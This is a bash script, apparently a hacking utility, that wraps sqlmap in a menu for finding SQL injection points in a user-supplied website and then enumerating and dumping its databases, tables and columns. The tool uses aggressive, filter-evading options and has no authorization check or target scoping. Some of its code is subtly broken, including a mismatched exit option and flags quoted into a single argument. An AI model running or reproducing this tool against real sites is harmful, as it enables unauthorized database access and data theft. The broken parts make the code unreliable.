#!/bin/bash
apt install  sqlmap
clear
# Function to print the banner
print_banner() {
echo -e  "\e[1;31m ************************************************************************************************ \e[0m"
echo -e "\e[1;31m                 WELCOME Hacker -This Tool is Advanced SQLmap AutoTool    *\e[0m"
echo -e "\e[1;31m *********************************************************************************************** \e[0m"
echo -e "\e[1;31m ---------------------------------visit www.github.com/hacksudo----------------------------- \e[0m"
echo -e  "\e[1;31m -------------------------------- Author - vishal waghmare----------------------------------- \e[0m"
}
#call print banner
print_banner
# Ask the user for their choice
echo "Select an option:"
echo "1. Find SQLinjection Parameter(without parameter)"
echo "2. Hack SQLi Site (with sql parameter)"
echo "3. Exit"
options=" --batch --level=5 --risk=3 --threads=5  --tamper=space2comment"
read -p "Enter Your choice : " choice

# Use a case statement to perform actions based on the user's choice
case $choice in
    1)
        echo "Want To Find SQL parameter?"
	read -p "Enter Your Site: " site
	sqlmap -g "$site"  "$options"
        ;;
    2)
        echo "Enter Your SQL parameter site link"
	read -p  "Enter Site : " site2
	sqlmap -u "$site2"  --dbs "$options"
	read -p  "Enter Database name:" database
	sqlmap -u "$site2" -D "$database" --tables "$options"
	read -p "Enter Table Name:" table
	sqlmap -u "$site2" -D "$database" -T  "$table" --columns "$options"
	read -p "Enter Column name:" column
	 sqlmap -u "$site2" -D "$database" -T  "$table" -C "$column" --dump  "$options"
        ;;
    4)
        echo "Exiting..."
        exit 0
        ;;
    *)
        echo "Invalid choice. Please select a valid option (1-3)."
        ;;
esac

